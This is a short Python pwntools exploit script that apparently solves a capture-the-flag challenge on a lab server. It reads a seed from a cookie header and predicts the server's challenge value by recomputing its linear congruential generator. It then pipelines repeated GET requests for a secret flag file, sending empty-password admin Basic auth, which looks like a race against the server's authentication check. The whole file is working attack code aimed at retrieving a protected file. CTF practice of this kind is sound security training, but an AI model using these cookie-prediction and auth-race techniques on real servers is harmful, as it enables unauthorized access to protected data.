#!/usr/bin/env python3
from pwn import *
import re
import time

context.log_level = 'info'
HOST = 'up.zoolab.org'
PORT = 10933
FLAG_PATH = '/secret/FLAG.txt'
NUM_REQUESTS = 10   

def compute_cookie(seed):
    return ((seed * 6364136223846793005 + 1) & 0xFFFFFFFFFFFFFFFF) >> 33

def extract_seed(response):
    match = re.search(r"Set-Cookie: challenge=(\d+);", response)
    if not match:
        log.error("Set-Cookie not found")
        return None
    return int(match.group(1))

def build_request(cookie, with_auth=True):
    lines = [f"GET {FLAG_PATH} HTTP/1.1"]
    if with_auth:
        lines.append("Authorization: Basic YWRtaW46")  # admin:
    lines.append(f"Cookie: response={cookie}")
    lines.append("")
    lines.append("")
    return "\r\n".join(lines).encode()

def main():
    io = remote(HOST, PORT)
    
    log.info("Sending initial dummy request to get seed")
    io.send(build_request(cookie=0, with_auth=False))
    # resp = io.recv(timeout=2).decode(errors='ignore')
    resp = io.recvuntil(b"\r\n\r\n", timeout=2).decode()

    print("=== Initial Response ===")
    print(resp)

    seed = extract_seed(resp)
    if seed is None:
        io.close()
        return

    cookie = compute_cookie(seed)
    log.success(f"reqseed = {seed}, cookie = {cookie}")

    request_payload = build_request(cookie=cookie, with_auth=True)

    log.info(f"Sending {NUM_REQUESTS} requests with valid cookie and auth...")
    for _ in range(NUM_REQUESTS):
        io.send(request_payload)

    time.sleep(0.5)
    response = io.recv(timeout=4).decode(errors='ignore')

    print("\n=== Combined Response ===")
    print(response)

    for r in response.split("HTTP/1.1 "):
        if "FLAG" in r:
            print("\n=== FLAG FOUND ===")
            print("HTTP/1.1 " + r)
            break
    else:
        print("\n[x] No flag found. Try increasing NUM_REQUESTS.")

    io.close()

if __name__ == "__main__":
    main()
